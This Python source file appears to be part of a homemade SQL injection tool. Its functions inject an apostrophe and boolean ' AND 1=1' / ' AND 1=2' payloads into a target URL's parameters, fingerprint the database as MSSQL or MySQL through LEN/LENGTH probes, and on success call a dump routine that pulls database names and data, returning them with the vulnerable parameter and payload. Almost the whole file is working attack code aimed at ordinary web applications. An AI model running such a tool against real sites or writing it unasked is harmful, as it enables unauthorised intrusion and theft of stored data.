import requests
from urllib.parse import urlencode
from engines import ENGINES
from core import dump_db, send, ecart
from collections import namedtuple


def get_engine(url, value, name, params):
        copy= params.copy()
        copy[name] = value + " AND LEN('a')=1"
        copy_mysql = params.copy()
        copy_mysql[name] = value + " AND LENGTH('a')=1"
        is_mssql = send(url, copy, "GET")
        is_mysql = send(url, copy_mysql, "GET")
        r = send(url, params, "GET")
        if(is_mssql.status_code == 200 and ecart(len(is_mssql.text), len(r.text)) < 10 ) :
            return ENGINES["mssql"]
        elif(is_mysql.status_code == 200 and ecart(len(is_mysql.text), len(r.text)) < 10 ) :
            return ENGINES["mysql"]
        else :
            return

        
def inject_apostrophe(name,value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value+ "'"
    r = send(parsed_url, params, method)
    copy_r = send(parsed_url, copy, method)
    if((r.status_code == 200 and copy_r.status_code == 500) or (ecart(len(r.text), len(copy_r.text)) > 30)):
        engine = get_engine(parsed_url, value, name, params)
        Ctx = namedtuple("Ctx", ["url", "params", "name", "method", "len"])
        ctx = Ctx(parsed_url, params, name, method, len(r.text))
        dump = dump_db(ctx, engine)
        final_dump= {
            "vulnerable param": name, 
            "payload": copy[name],
            "engine": engine["type"],
            "bases": dump["bases"],
            "data": dump["data"]
        }
        return final_dump

def inject_bool(name,value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value+ ' AND 1=1'
    fcopy = params.copy()
    fcopy[name] = value+ ' AND 1=2'
    r = send(parsed_url, params, method)
    r_copy= send(parsed_url, copy, method)
    fail_r = send(parsed_url, fcopy, method)
    if((ecart(len(r_copy.text), len(r.text)) < 10 and ecart(len(fail_r.text), len(r_copy.text)) > 30) or (r_copy.status_code == 200 and fail_r.status_code==500)):
        engine = get_engine(parsed_url, value, name, params)
        Ctx = namedtuple("Ctx", ["url", "params", "name", "method", "len"])
        ctx = Ctx(parsed_url, params, name, method, len(r.text))
        dump = dump_db(ctx, engine)
        final_dump= {
            "vulnerable param": name, 
            "payload": copy[name],
            "engine": engine["type"],
            "bases": dump["bases"],
            "data": dump["data"]
        }
        return final_dump